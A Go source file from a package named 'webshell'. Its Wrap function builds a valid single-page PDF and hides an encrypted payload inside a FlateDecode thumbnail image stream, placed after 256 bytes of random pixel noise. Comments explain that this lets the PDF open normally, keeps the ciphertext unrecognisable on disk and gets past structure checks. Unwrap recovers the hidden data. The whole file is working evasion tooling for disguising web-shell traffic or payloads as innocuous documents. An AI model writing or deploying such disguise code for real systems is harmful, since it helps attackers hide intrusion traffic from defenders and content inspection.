package webshell

// disguise_pdf.go — PDF FlateDecode 容器链。
//
// 容器是一个结构完整的 PDF 1.5：Catalog → Pages → Page（含一页浅灰底）+ 两个流对象。
// 密文以 FlateDecode 流的形式藏在页面的 /Thumb 缩略图对象里：缩略图声明 16×16 灰度，
// 解压后先是 256 字节像素、紧接着是密文，渲染器按声明的尺寸读满 256 字节即停，
// 多出来的部分被忽略——所以 PDF 能正常打开，缩略图也不会花。
//
// 放在 /Thumb 而不是内容流里，是为了避开「随机二进制被当作绘图指令解析」导致
// 阅读器报错的问题；作为被引用的叶节点，结构校验也过得去。

import (
	"bytes"
	"compress/zlib"
	"crypto/rand"
	"errors"
	"fmt"
	"io"
	"regexp"
	"strconv"
)

const (
	pdfThumbW = 16
	pdfThumbH = 16
	// pdfThumbPixels 缩略图像素字节数（8bit 灰度）。
	pdfThumbPixels = pdfThumbW * pdfThumbH
)

type pdfDisguise struct{}

func (pdfDisguise) Name() string        { return "pdf" }
func (pdfDisguise) ContentType() string { return "application/pdf" }

func (pdfDisguise) Wrap(secret []byte) ([]byte, error) {
	if len(secret) == 0 {
		return nil, errors.New("pdf: 载荷为空")
	}
	// 缩略图像素 + 密文一起压缩：像素是随机噪声，保证密文不以可识别形态落盘
	raw := make([]byte, pdfThumbPixels, pdfThumbPixels+len(secret))
	if _, err := rand.Read(raw); err != nil {
		return nil, fmt.Errorf("pdf: 生成缩略图失败: %w", err)
	}
	raw = append(raw, packSecret(secret)...)

	var comp bytes.Buffer
	zw := zlib.NewWriter(&comp)
	if _, err := zw.Write(raw); err != nil {
		return nil, err
	}
	if err := zw.Close(); err != nil {
		return nil, err
	}
	stream := comp.Bytes()

	// 页面内容：浅灰底 + 一条标题线，让打开时不至于全白
	content := "0.95 0.95 0.95 rg\n0 0 612 792 re f\n0.2 0.2 0.2 RG\n1 w\n72 720 m 540 720 l S\n"
	var cbuf bytes.Buffer
	cw := zlib.NewWriter(&cbuf)
	if _, err := cw.Write([]byte(content)); err != nil {
		return nil, err
	}
	if err := cw.Close(); err != nil {
		return nil, err
	}
	contentStream := cbuf.Bytes()

	var buf bytes.Buffer
	buf.WriteString("%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")
	offsets := make([]int, 6) // 1..5 各对象起始偏移

	offsets[1] = buf.Len()
	buf.WriteString("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")

	offsets[2] = buf.Len()
	buf.WriteString("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")

	offsets[3] = buf.Len()
	buf.WriteString("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] ")
	buf.WriteString("/Resources << >> /Contents 4 0 R /Thumb 5 0 R >>\nendobj\n")

	offsets[4] = buf.Len()
	fmt.Fprintf(&buf, "4 0 obj\n<< /Length %d /Filter /FlateDecode >>\nstream\n", len(contentStream))
	buf.Write(contentStream)
	buf.WriteString("\nendstream\nendobj\n")

	offsets[5] = buf.Len()
	fmt.Fprintf(&buf, "5 0 obj\n<< /Type /XObject /Subtype /Image /Width %d /Height %d /ColorSpace /DeviceGray /BitsPerComponent 8 /Filter /FlateDecode /Length %d >>\nstream\n",
		pdfThumbW, pdfThumbH, len(stream))
	buf.Write(stream)
	buf.WriteString("\nendstream\nendobj\n")

	xref := buf.Len()
	buf.WriteString("xref\n0 6\n")
	buf.WriteString("0000000000 65535 f \n")
	for i := 1; i <= 5; i++ {
		fmt.Fprintf(&buf, "%010d 00000 n \n", offsets[i])
	}
	fmt.Fprintf(&buf, "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n", xref)
	return buf.Bytes(), nil
}

var pdfImageObjRe = regexp.MustCompile(`(?s)\d+ 0 obj\s*<<[^>]*?/Subtype\s*/Image[^>]*?/Length\s+(\d+)[^>]*?>>\s*stream\r?\n`)

func (pdfDisguise) Unwrap(container []byte) ([]byte, error) {
	if !bytes.HasPrefix(container, []byte("%PDF-")) {
		return nil, errors.New("pdf: 不是 PDF 容器")
	}
	loc := pdfImageObjRe.FindSubmatchIndex(container)
	if loc == nil {
		return nil, errors.New("pdf: 未找到图像流对象")
	}
	length, err := strconv.Atoi(string(container[loc[2]:loc[3]]))
	if err != nil || length <= 0 {
		return nil, errors.New("pdf: 流长度非法")
	}
	start := loc[1]
	if start+length > len(container) {
		return nil, errors.New("pdf: 流长度越界")
	}
	stream := container[start : start+length]

	zr, err := zlib.NewReader(bytes.NewReader(stream))
	if err != nil {
		return nil, fmt.Errorf("pdf: 流解压失败: %w", err)
	}
	defer zr.Close()
	raw, err := io.ReadAll(io.LimitReader(zr, maxDisguiseRaw))
	if err != nil {
		return nil, fmt.Errorf("pdf: 读取流失败: %w", err)
	}
	if len(raw) <= pdfThumbPixels {
		return nil, errors.New("pdf: 缩略图像素之后没有载荷")
	}
	return unpackSecret(raw[pdfThumbPixels:])
}
